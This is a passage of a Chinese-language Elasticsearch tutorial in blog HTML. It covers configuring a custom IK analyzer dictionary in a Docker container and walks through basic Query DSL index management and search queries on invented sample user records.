class="line">  &quot;text&quot;: &quot;中华人民共和国人民大会堂&quot;,  </span><br><span class="line">  &quot;analyzer&quot;: &quot;ik\_smart&quot;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-5-自定义扩展字典"><a href="#3-5-自定义扩展字典" class="headerlink" title="3.5 自定义扩展字典"></a><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/17.png"><br>3.5 自定义扩展字典</h2><p>IK分词器的两种模式的最佳实践是：索引时用ik_max_word，搜索时用ik_smart，索引时最大化的将文章内容分词，搜索时更精确的搜索到想要的结果。</p><p>举个例子：用户输入“华为手机”搜索，此时应该搜索出“华为手机”的商品，而不是“华为”和“手机”这两个词，这样会搜索出华为其它的商品，</p><p>此时使用ik_smart和ik_max_word都会将华为手机拆分为华为和手机两个词，那些只包括“华为”这个词的信息也被搜索出来了，我的目标是搜索只包含华为手机这个词的信息，这没有满足我的目标。</p><p>ik_smart默认情况下分词“华为手机”，依然会分成两个词“华为”和“手机”，这时需要使用自定义扩展字典</p><ol><li><strong>进入es</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker exec -it es /bin/bash  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>增加自定义字典文件</strong></li></ol><p>如果容器编辑乱码，可以在宿主机编辑，然后拷贝到容器中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#进入ik配置目录  </span><br><span class="line">cd plugins/ik/config/  </span><br><span class="line">vi new\_word.dic  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">老铁  </span><br><span class="line">王者荣耀  </span><br><span class="line">洪荒之力  </span><br><span class="line">共有产权房  </span><br><span class="line">一带一路  </span><br><span class="line">java日知录  </span><br><span class="line">华为手机  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>修改配置文件</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">vi IKAnalyzer.cfg.xml  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE properties SYSTEM &quot;http://java.sun.com/dtd/properties.dtd&quot;\&gt;  </span><br><span class="line">&lt;properties&gt;  </span><br><span class="line">        &lt;comment&gt;IK Analyzer 扩展配置&lt;/comment&gt;  </span><br><span class="line">        &lt;!--用户可以在这里配置自己的扩展字典 --&gt;  </span><br><span class="line">        &lt;entry key=&quot;ext\_dict&quot;\&gt;new\_word.dic&lt;/entry&gt;  </span><br><span class="line">         &lt;!--用户可以在这里配置自己的扩展停止词字典--&gt;  </span><br><span class="line">        &lt;entry key=&quot;ext\_stopwords&quot;\&gt;&lt;/entry&gt;  </span><br><span class="line">        &lt;!--用户可以在这里配置远程扩展字典 --&gt;  </span><br><span class="line">        &lt;!-- &lt;entry key=&quot;remote\_ext\_dict&quot;\&gt;words\_location&lt;/entry&gt; --&gt;  </span><br><span class="line">        &lt;!--用户可以在这里配置远程扩展停止词字典--&gt;  </span><br><span class="line">        &lt;!-- &lt;entry key=&quot;remote\_ext\_stopwords&quot;\&gt;words\_location&lt;/entry&gt; --&gt;  </span><br><span class="line">&lt;/properties&gt;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li><strong>拷贝到宿主机</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker cp es:/usr/share/elasticsearch/plugins/elasticsearch-analysis-ik/config ~/ik  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li><strong>重启</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker restart es  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="4-高级的DSL-查询"><a href="#4-高级的DSL-查询" class="headerlink" title="4 高级的DSL 查询"></a>4 高级的DSL 查询</h1><p>前面介绍了基础的DSL查询，接下来，介绍一下高级的DSL 查询</p><p>ES提供基于DSL(Domain Specific Language)的索引查询模式，</p><p>DSL查询基于JSON定义查询</p><p>Wikipedia对于DSL的定义”<strong>为了解决某一类任务而专门设计的计算机语言”</strong></p><p>大师Martin Fowler对于DSL定义“<strong>DSL 通过在表达能力上做的妥协换取在某一领域内的高效</strong>”</p><p>我们在使用ES的时候，避免不了使用DSL语句去查询，就像使用关系型数据库的时候要学会SQL语法一样。</p><p>如果我们学习好了DSL语法的使用，那么在日后使用和使用Java Client调用时候也会变得非常简单。</p><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/18.png"></p><blockquote><p>Elasticsearch provides a full Query DSL (Domain Specific Language) based on JSON to define queries. Think of the Query DSL as an AST (Abstract Syntax Tree) of queries</p></blockquote><h2 id="4-1-管理索引"><a href="#4-1-管理索引" class="headerlink" title="4.1 管理索引"></a>4.1 管理索引</h2><p>查看所有的索引</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">GET \_cat/indices?v  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/19.png"></p><ol><li><strong>删除某个索引</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">DELETE /skuinfo  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>新增索引</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">PUT /user  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>创建映射</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">PUT /user/\_mapping  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;properties&quot;: &#123;  </span><br><span class="line">    &quot;name&quot;:&#123;  </span><br><span class="line">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">      &quot;analyzer&quot;: &quot;ik\_smart&quot;,  </span><br><span class="line">      &quot;search\_analyzer&quot;: &quot;ik\_smart&quot;  </span><br><span class="line">    &#125;,  </span><br><span class="line">    &quot;city&quot;:&#123;  </span><br><span class="line">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">      &quot;analyzer&quot;: &quot;ik\_smart&quot;,  </span><br><span class="line">      &quot;search\_analyzer&quot;: &quot;ik\_smart&quot;  </span><br><span class="line">    &#125;,  </span><br><span class="line">    &quot;age&quot;:&#123;  </span><br><span class="line">      &quot;type&quot;: &quot;long&quot;  </span><br><span class="line">    &#125;,  </span><br><span class="line">    &quot;description&quot;:&#123;  </span><br><span class="line">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">      &quot;analyzer&quot;: &quot;ik\_smart&quot;,  </span><br><span class="line">      &quot;search\_analyzer&quot;: &quot;ik\_smart&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li><strong>新增文档数据</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">PUT /user/\_doc/1  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;李四&quot;,  </span><br><span class="line">  &quot;age&quot;:22,  </span><br><span class="line">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;李四来自湖北武汉！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再增加几条记录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#新增文档数据 id=2  </span><br><span class="line">PUT /user/\_doc/2  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;王五&quot;,  </span><br><span class="line">  &quot;age&quot;:35,  </span><br><span class="line">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;王五家住在深圳！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=3  </span><br><span class="line">PUT /user/\_doc/3  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;张三&quot;,  </span><br><span class="line">  &quot;age&quot;:19,  </span><br><span class="line">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;在深圳打工，来自湖北武汉&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=4  </span><br><span class="line">PUT /user/\_doc/4  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class="line">  &quot;age&quot;:66,  </span><br><span class="line">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=5  </span><br><span class="line">PUT /user/\_doc/5  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;赵子龙&quot;,  </span><br><span class="line">  &quot;age&quot;:77,  </span><br><span class="line">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;赵子龙来自深圳宝安，但是在广州工作！&quot;,  </span><br><span class="line">  &quot;address&quot;:&quot;广东省茂名市&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=6  </span><br><span class="line">PUT /user/\_doc/6  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;赵毅&quot;,  </span><br><span class="line">  &quot;age&quot;:55,  </span><br><span class="line">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;赵毅来自广州白云区，从事电子商务8年！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=7  </span><br><span class="line">PUT /user/\_doc/7  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;赵哈哈&quot;,  </span><br><span class="line">  &quot;age&quot;:57,  </span><br><span class="line">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;武汉赵哈哈，在深圳打工已有半年了，月薪7500！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li><strong>修改数据</strong></li></ol><p><strong>（1）操作1</strong></p><p>更新数据可以使用之前的增加操作,这种操作会将整个数据替换掉，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#更新数据,id=4  </span><br><span class="line">PUT /user/\_doc/4  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用GET命令查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#根据ID查询  </span><br><span class="line">GET /user/\_doc/4  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>（2）操作2</strong></p><p>我们先使用下面命令恢复数据：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#恢复文档数据 id=4  </span><br><span class="line">PUT /user/\_doc/4  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class="line">  &quot;age&quot;:66,  </span><br><span class="line">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用POST更新某个列的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#使用POST更新某个域的数据  </span><br><span class="line">POST /user/\_doc/4  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;doc&quot;:&#123;  </span><br><span class="line">    &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class="line">    &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="6"><li><strong>删除Document</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#删除数据  </span><br><span class="line">DELETE user/userinfo/7  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-2-数据查询"><a href="#4-2-数据查询" class="headerlink" title="4.2 数据查询"></a>4.2 数据查询</h2><ol><li><strong>查询所有数据</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#查询所有  </span><br><span class="line">GET /user/\_search  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>根据ID查询</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#根据ID查询  </span><br><span class="line">GET /user/\_doc/2  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>Sort排序</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#搜索排序  </span><br><span class="line">GET /user/\_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;:&#123;  </span><br><span class="line">    &quot;match\_all&quot;: &#123;&#125;  </span><br><span class="line">  &#125;,  </span><br><span class="line">  &quot;sort&quot;:&#123;  </span><br><span class="line">    &quot;age&quot;:&#123;  </span><br><span class="line">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li><strong>分页</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#分页实现  </span><br><span class="line">GET /user/\_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;:&#123;  </span><br><span class="line">    &quot;match\_all&quot;: &#123;&#125;  </span><br><span class="line">  &#125;,  </span><br><span class="line">  &quot;sort&quot;:&#123;  </span><br><span class="line">    &quot;age&quot;:&#123;  </span><br><span class="line">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;,  </span><br><span class="line">  &quot;from&quot;: 0,  </span><br><span class="line">  &quot;size&quot;: 2  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>from:从下N的记录开始查询</p></li><li><p>size:每页显示条数</p></li></ul><h2 id="4-3-查询模式"><a href="#4-3-查询模式" class="headerlink" title="4.3 查询模式"></a>4.3 查询模式</h2><ol><li><strong>term查询</strong></li></ol><p>term主要用于分词精确匹配，如字符串、数值、日期等（不适合情况：1.列中除英文字符外有其它值 2.字符串值中有冒号或中文 3.系统自带属性如_version）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#查询-term  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;:&#123;  </span><br><span class="line">    &quot;term&quot;:&#123;  </span><br><span class="line">      &quot;city&quot;:&quot;武汉&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>terms 查询</strong></li></ol><p>terms 跟 term 有点类似，但 terms 允许指定多个匹配条件。 如果某个字段指定了多个值，那么文档需要一起去做匹配 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#查询-terms 允许多个Term  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;:&#123;  </span><br><span class="line">    &quot;terms&quot;:&#123;  </span><br><span class="line">      &quot;city&quot;:  </span><br><span class="line">        \[  </span><br><span class="line">          &quot;武汉&quot;,  </span><br><span class="line">          &quot;广州&quot;  </span><br><span class="line">        \]  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>match查询</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;match&quot;: &#123;  </span><br><span class="line">      &quot;city&quot;: &quot;广州武汉&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li><strong>query_string查询</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;query\_string&quot;: &#123;  </span><br><span class="line">      &quot;default\_field&quot;: &quot;city&quot;,  </span><br><span class="line">      &quot;query&quot;: &quot;广州武汉&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li><strong>range 查询</strong></li></ol><p>range过滤允许我们按照指定范围查找一批数据。例如我们查询年龄范围</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#-range 范围过滤  </span><br><span class="line">#gt表示&gt; gte表示=&gt;  </span><br><span class="line">#lt表示&lt; lte表示&lt;=  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;:&#123;  </span><br><span class="line">    &quot;range&quot;: &#123;  </span><br><span class="line">      &quot;age&quot;: &#123;  </span><br><span class="line">        &quot;gte&quot;: 30,  </span><br><span class="line">        &quot;lte&quot;: 57  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="6"><li><strong>exists</strong></li></ol><p>exists 过滤可以用于查找拥有某个域的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#搜索 exists：是指包含某个域的数据检索  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;exists&quot;:&#123;  </span><br><span class="line">      &quot;field&quot;:&quot;address&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="7"><li><strong>bool 查询</strong></li></ol><p>bool 可以用来合并多个条件查询结果的布尔逻辑，它包含以下操作符：</p><ul><li><p>must : 多个查询条件的完全匹配,相当于 and。</p></li><li><p>must_not : 多个查询条件的相反匹配，相当于 not。</p></li><li><p>should : 至少有一个查询条件匹配, 相当于 or。</p></li></ul><p>这些参数可以分别继承一个过滤条件或者一个过滤条件的数组：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#过滤搜索 bool   </span><br><span class="line">#must : 多个查询条件的完全匹配,相当于 and。  </span><br><span class="line">#must\_not : 多个查询条件的相反匹配，相当于 not。  </span><br><span class="line">#should : 至少有一个查询条件匹配, 相当于 or。  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;bool&quot;: &#123;  </span><br><span class="line">      &quot;must&quot;: \[  </span><br><span class="line">        &#123;  </span><br><span class="line">          &quot;term&quot;: &#123;  </span><br><span class="line">            &quot;city&quot;: &#123;  </span><br><span class="line">              &quot;value&quot;: &quot;深圳&quot;  </span><br><span class="line">            &#125;  </span><br><span class="line">          &#125;  </span><br><span class="line">        &#125;,  </span><br><span class="line">        &#123;  </span><br><span class="line">          &quot;range&quot;:&#123;  </span><br><span class="line">            &quot;age&quot;:&#123;  </span><br><span class="line">              &quot;gte&quot;:20,  </span><br><span class="line">              &quot;lte&quot;:99  </span><br><span class="line">            &#125;  </span><br><span class="line">          &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">      \]  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="8"><li><strong>match_all 查询</strong></li></ol><p>可以查询到所有文档，是没有查询条件下的默认语句。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#查询所有 match\_all  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;match\_all&quot;: &#123;&#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="9"><li><strong>match 查询</strong></li></ol><p>match查询是一个标准查询，不管你需要全文本查询还是精确查询基本上都要用到它。如果你使用 match 查询一个全文本字段，它会在真正查询之前用分析器先分析match一下查询字符：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#字符串匹配  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;match&quot;: &#123;  </span><br><span class="line">      &quot;description&quot;: &quot;武汉广州&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="10"><li><strong>prefix 查询</strong></li></ol><p>以什么字符开头的，可以更简单地用 prefix ,例如查询所有以张开始的用户描述</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#前缀匹配 prefix  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;prefix&quot;: &#123;  </span><br><span class="line">      &quot;name&quot;: &#123;  </span><br><span class="line">        &quot;value&quot;: &quot;赵&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="10"><li><strong>multi_match 查询</strong></li></ol><p>multi_match查询允许你做match查询的基础上同时搜索多个字段，在多个字段中同时查一个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#多个域匹配搜索  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;multi\_match&quot;: &#123;  </span><br><span class="line">      &quot;query&quot;: &quot;深圳&quot;,  </span><br><span class="line">      &quot;fields&quot;: \[  </span><br><span class="line">        &quot;city&quot;,  </span><br><span class="line">        &quot;description&quot;  </span><br><span class="line">      \]  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="11"><li><strong>filter</strong></li></ol><p>因为过滤可以使用缓存，同时不计算分数，通常的规则是，使用查询（query）语句来进行 全文 搜索或者其它任何需要影响 相关性得分 的搜索。除此以外的情况都使用过滤（filters)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">GET /user/\_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;bool&quot;: &#123;  </span><br><span class="line">      &quot;filter&quot;: &#123;  </span><br><span class="line">         &quot;range&quot;:&#123;  </span><br><span class="line">          &quot;age&quot;:&#123;  </span><br><span class="line">            &quot;gte&quot;:25,  </span><br><span class="line">            &quot;lte&quot;: 80  </span><br><span class="line">          &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完整DSL案例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">GET \_cat/health?v  </span><br><span class="line">  </span><br><span class="line">GET \_cat/nodes?v  </span><br><span class="line">  </span><br><span class="line">GET \_cat/indices?v  </span><br><span class="line">  </span><br><span class="line">DELETE /user  </span><br><span class="line">  </span><br><span class="line">PUT /user  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">PUT /user/\_mapping  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;properties&quot;: &#123;  </span><br><span class="line">    &quot;name&quot;:&#123;  </span><br><span class="line">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">      &quot;analyzer&quot;: &quot;ik\_smart&quot;,  </span><br><span class="line">      &quot;search\_analyzer&quot;: &quot;ik\_smart&quot;  </span><br><span class="line">    &#125;,  </span><br><span class="line">    &quot;city&quot;:&#123;  </span><br><span class="line">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">      &quot;analyzer&quot;: &quot;ik\_smart&quot;,  </span><br><span class="line">      &quot;search\_analyzer&quot;: &quot;ik\_smart&quot;  </span><br><span class="line">    &#125;,  </span><br><span class="line">    &quot;age&quot;:&#123;  </span><br><span class="line">      &quot;type&quot;: &quot;long&quot;  </span><br><span class="line">    &#125;,  </span><br><span class="line">    &quot;description&quot;:&#123;  </span><br><span class="line">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">      &quot;analyzer&quot;: &quot;ik\_smart&quot;,  </span><br><span class="line">      &quot;search\_analyzer&quot;: &quot;ik\_smart&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">PUT /user/\_doc/1  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;李四&quot;,  </span><br><span class="line">  &quot;age&quot;:22,  </span><br><span class="line">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;李四来自湖北武汉！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=2  </span><br><span class="line">PUT /user/\_doc/2  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;王五&quot;,  </span><br><span class="line">  &quot;age&quot;:35,  </span><br><span class="line">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;王五家住在深圳！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=3  </span><br><span class="line">PUT /user/\_doc/3  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;张三&quot;,  </span><br><span class="line">  &quot;age&quot;:19,  </span><br><span 